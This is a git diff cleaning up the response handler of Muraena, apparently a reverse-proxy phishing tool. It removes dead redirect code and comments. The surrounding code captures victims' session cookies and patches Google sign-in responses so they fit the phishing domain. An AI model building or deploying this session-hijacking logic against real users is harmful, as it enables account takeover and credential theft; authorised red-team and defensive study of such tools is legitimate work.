@@ -326,55 +326,6 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 	// Replacer object
 	replacer := muraena.Replacer
 
-	//
-	// Garbage ..
-	//
-
-	// DROP
-	// dropRequest := false
-	//
-	// TODO: is this still needed? We redirect Requests in the RequestProcessor
-	// for _, drop := range sess.Config.Redirects {
-	//
-	// 	if drop.RedirectTo == "" {
-	// 		continue
-	// 	}
-	//
-	// 	// if the drop is empty, it means that we want to drop all the requests
-	// 	// and we don't want to redirect them
-	// 	if drop.Hostname == "" && drop.Path == "" && drop.Query == "" {
-	// 		continue
-	// 	}
-	//
-	// 	if drop.Hostname != "" && response.Request.Host != drop.Hostname {
-	// 		continue
-	// 	}
-	//
-	// 	if drop.Path != "" && response.Request.URL.Path != drop.Path {
-	// 		continue
-	// 	}
-	//
-	// 	if drop.Query != "" && response.Request.URL.RawQuery != drop.Query {
-	// 		continue
-	// 	}
-	//
-	// 	// Invalid HTTP code fallback to 302
-	// 	if drop.HTTPStatusCode == 0 {
-	// 		drop.HTTPStatusCode = 302
-	// 	}
-	//
-	// 	response.StatusCode = drop.HTTPStatusCode
-	// 	response.Header.Set("Location", drop.RedirectTo)
-	// 	log.Info("Dropped request %s redirected to: %s", drop.Path, drop.RedirectTo)
-	// 	// dropRequest = true
-	// 	// break
-	// 	return
-	// }
-
-	// if dropRequest {
-	// 	return
-	// }
-
 	// Add extra HTTP headers
 	for _, header := range sess.Config.Transform.Response.Add.Headers {
 		response.Header.Set(header.Name, header.Value)
@@ -427,22 +378,8 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 
 					log.Verbose("Set-Cookie: %s", response.Header["Set-Cookie"][k])
 				}
-			} else if header == "Location" {
-				// TODO: Cleanup this mess
-
-				//
-				// if len(replacer.SubdomainMap) > 0 {
-				//	for _, m := range replacer.SubdomainMap {
-				//		if strings.Contains(response.Header.Get(header), m[1]) {
-				//			// replace only the first occurrence starting from the left
-				//			response.Header.Set(header, strings.Replace(response.Header.Get(header), m[1], m[0], -1))
-				//			break
-				//		}
-				//	}
-				// }
-
-				response.Header.Set(header, replacer.Transform(response.Header.Get(header), false, base64))
-
+				// } else if header == "Location" {
+				// 	response.Header.Set(header, replacer.Transform(response.Header.Get(header), false, base64))
 			} else {
 				response.Header.Set(header, replacer.Transform(response.Header.Get(header), false, base64))
 			}
@@ -478,7 +415,6 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 				log.Warning("Error: cannot retrieve Victim from tracker: %s", err)
 			}
 
-			// victim := muraena.Tracker.TrackResponse(response)
 			if victim != nil {
 				// before transforming headers like cookies, store the cookies in the CookieJar
 				for _, c := range response.Cookies() {
@@ -487,7 +423,6 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 					}
 
 					c.Domain = strings.Replace(c.Domain, ":443", "", -1)
-
 					sessCookie := db.VictimCookie{
 						Name:     c.Name,
 						Value:    c.Value,
@@ -570,22 +505,11 @@ func (muraena *MuraenaProxy) ResponseProcessor(response *http.Response) (err err
 	// process body and pack again
 	newBody := replacer.Transform(string(responseBuffer), false, base64)
 
-	//
 	// Ugly Google patch
-	//
-	// If request URL contains: AccountsSignInUi/data/batchexecute
-	// the go for another round of patches
 	if strings.Contains(response.Request.URL.Path, "AccountsSignInUi/data/batchexecute") {
-
-		// if body contains the phishing domain
 		if strings.Contains(newBody, muraena.Session.Config.Proxy.Phishing) {
-			// if body contains )]}'\n\n then patch it
 			if strings.HasPrefix(newBody, ")]}'\n\n") {
-
-				// fmt.Println("newBody: ", newBody)
 				newBody = patchGoogleStructs(newBody)
-				// fmt.Println("updated newBody: ", newBody)
-
 			}
 		}
 	}
